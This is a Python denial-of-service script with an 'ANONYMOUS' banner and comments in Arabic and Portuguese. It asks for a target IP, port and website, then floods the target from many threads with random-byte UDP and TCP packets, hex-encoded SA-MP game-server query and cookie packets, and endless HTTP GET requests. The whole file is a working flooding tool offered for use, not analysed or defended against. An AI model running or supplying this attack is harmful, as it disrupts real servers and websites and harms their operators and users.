import random
import threading
import codecs
import time
import socket
import sys
import os
import requests  # مكتبة لعمل الهجوم على المواقع HTTP/HTTPS

os.system("clear")
print("""
 ___    _   ______  _   ____  ____  _______  __  _______
   /   |  / | / / __ \/ | / /\ \/ /  |/  / __ \/ / / / ___/
  / /| | /  |/ / / / /  |/ /  \  / /|_/ / / / / / / /\__ \
 / ___ |/ /|  / /_/ / /|  /   / / /  / / /_/ / /_/ /___/ /
/_/  |_/_/ |_/\____/_/ |_/   /_/_/  /_/\____/\____//____/
""")

ip = str(input("Target Ip:"))
port = int(input("Target Port:"))
website = str(input("Enter Website (http://example.com):"))  # إضافة حقل للموقع
choice = str(input("Thb Tnik Serveur? (y/n):"))
times = int(input("Packet:"))
threads = int(input("Threads:"))
fake_ip = '182.21.20.32'

# Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]

def run():
    data = random._urandom(1460)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
            print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
        except:
            print("[ANONYMOUS] STRIKES BACK!")

def run2():
    data = random._urandom(1204)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
        except:
            s.close()
            print("[ANONYMOUS] STRIKES BACK!")

def run3():
    data = random._urandom(999)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
        except:
            s.close()
            print("[ANONYMOUS ynikom!")

def run4():
    data = random._urandom(818)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
        except:
            s.close()
            print("[ANONYMOUS] is back!")

def run5():
    data = random._urandom(16)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
        except:
            s.close()
            print("[ANONYMOUS] Anonaymous ynikom!")

# Urandom Dan Pacotes
class MyThread(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            msg = Pacotes[random.randrange(0, 5)]
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))

# هجوم على الموقع باستخدام HTTP GET requests
def attack_website():
    while True:
        try:
            response = requests.get(website)
            print(f"[ANONYMOUS] Attack on {website} has been launched with status code {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[ANONYMOUS] Error attacking {website}: {e}")

if __name__ == '__main__':
    try:
        for x in range(200):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(0.1)    
    except(KeyboardInterrupt):
        os.system('cls' if os.name == 'nt' else 'clear')

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target=run)
        th.start()
        th = threading.Thread(target=run2)
        th.start()
        th = threading.Thread(target=run3)
        th.start()
        th = threading.Thread(target=run4)
        th.start()
    else:
        th = threading.Thread(target=run5)
        th.start()

# بدء هجوم على الموقع إذا كان الخيار 'y'
if choice == 'y':
    attack_website_thread = threading.Thread(target=attack_website)
    attack_website_thread.start()
